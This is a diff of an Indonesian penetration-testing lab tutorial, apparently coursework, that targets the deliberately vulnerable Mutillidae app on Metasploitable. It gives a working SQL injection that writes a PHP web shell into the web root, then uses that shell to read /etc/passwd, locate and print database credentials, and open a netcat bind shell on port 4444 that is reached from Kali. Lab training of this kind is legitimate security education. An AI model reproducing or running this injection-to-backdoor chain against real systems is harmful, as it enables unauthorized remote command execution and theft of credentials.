@@ -16,48 +16,67 @@ AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivit
 ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/mutillidae/execute_command.php' -- 
 ```
 Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **execute_command.php**
+![](/assets/lesson-9/injection_result.JPG)
 
-* **Step 5** : Melihat hasil operasi dengan command berikut pada OS Metasploitable `cat /var/www/mutillidae/execute_command.php` 
+
+* **Step 5** : Melihat hasil operasi dengan web browser `http://10.151.36.64/mutillidae/execute_command.php` 
+![](/assets/lesson-10/backdoor_2.JPG)
+
 
 ### \# Menggunakan Backdoor untuk pengamatan dasar
 
-* **Step 1** : Buka halaman php yang sudah kita buat `http://10.151.36.64/mutillidae/execute_command.php`
-
-* **Step 2** : Masukan command linux pada textbox tersebut `whoami; pwd; w`.
+* **Step 1** : Masukan command linux pada textbox tersebut `whoami; pwd; w`.
 **whoami** : melihat username yang digunakan
 **pwd** : melihat working directory
 **w** : melihar user yang sedang login dan dikerjakan
+![](/assets/lesson-10/backdoor_3.JPG)
 
-* **Step 3** : Masukan command linux pada textbox tersebut `cat /etc/passwd` dan `netstat -nao | grep "0.0.0.0:"`.
+* **Step 2** : Masukan command linux pada textbox tersebut `cat /etc/passwd` dan `netstat -nao | grep "0.0.0.0:"`.
 **cat /etc/passwd** : melihat informasi untuk login, dengan field antara lain Username, Password Existance, User ID, Group ID, Gecos, Home Directory, and Shell
 **netstat -nao | grep "0.0.0.0:"** : melihat koneksi port yang sedang berlangsung pada ip 0.0.0.0
 
+![](/assets/lesson-10/backdoor_4.JPG)
+
 Terlihat ada user-user yang potensial untuk diserang seperti user apache, mysql, dll.
-Terlihat ada port-port yang biasa digunakan oleh suatu service yang potensial untuk diserang seperti user apache, mysql, dll.
+
+![](/assets/lesson-10/backdoor_5.JPG)
+
+Terlihat ada port-port yang biasa digunakan oleh suatu service yang potensial untuk diserang seperti mysql, dll.
 
 ### \# Menggunakan Backdoor untuk pengamatan Database
 
-* **Step 1** : Masukan command linux pada textbox tersebut `ls | grep ".inc`. Hal ini dilakukan untuk mencari file berekstensi `.inc` di directory Mutillidae, yang disasar adalah username dan password database mysql.
+* **Step 1** : Mencari file yang berisi konfigurasi database, dengan execute command `find /var/www/mutillidae | xargs grep -i "dbuser"`.
+![](/assets/lesson-10/backdoor_6.JPG)
 
 Terlihat terdapat file `config.inc`, file ini diduga berisi konfigurasi database mysql.
 
 * **Step 2** : Masukan command linux pada textbox tersebut `cat config.inc | grep -v "<?php"`. Hal ini dilakukan untuk melihat file sebab jika kita tidak gunakan `grep` web tidak akan mencetak nya karena file berisi script php
+![](/assets/lesson-10/backdoor_7.JPG)
 
-Terlihat host, username, password, dan nama database dari MySQL yang digunakan web Mutillidae
+Tercatat :
+**host** : localhost atau 0.0.0.0
+**user** : root
+**password** : (kosong)
+**nama database** : owasp10
 
 ### \# Menggunakan Backdoor untuk pengamatan Netcat
 
 * **Step 1** : Masukan command linux pada textbox tersebut `which nc; netstat -nao | grep 4444 | wc -l`.
 **which nc** : melihat dimana netcat berada
 **netstat -nao | grep 4444 | wc -l** : melihat jumlah semua koneksi ke port 4444
+![](/assets/lesson-10/backdoor_8.JPG)
+
 
 * **Step 2** : Masukan command linux pada textbox tersebut `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe`.
 **mkfifo** : proses dapat saling berkomunikasi dilakukan melalui pipes. Pipes dapat dibuat dengan mengunakan perintah ini
 **nc -l 4444** : meminta netcat untuk listen & allow connections di port 4444
+![](/assets/lesson-10/backdoor_9.JPG)
 
 Terlihat koneksi terus berputar hal ini manandakan port 444 sedang listen atau menunggu adanya koneksi/transfer data
 
-* **Step 3** : Sebari langkah 2 berjalan, masukan command linux pada terminal Kali Linux `nc 10.151.36.64 4444`. Kemudian masukan command cli yang anda inginkan.
+* **Step 3** : Sembari langkah 2 berjalan, masukan command linux pada terminal Kali Linux `nc 10.151.36.64 4444`. Kemudian masukan command cli yang anda inginkan.
+
+
 
 
 
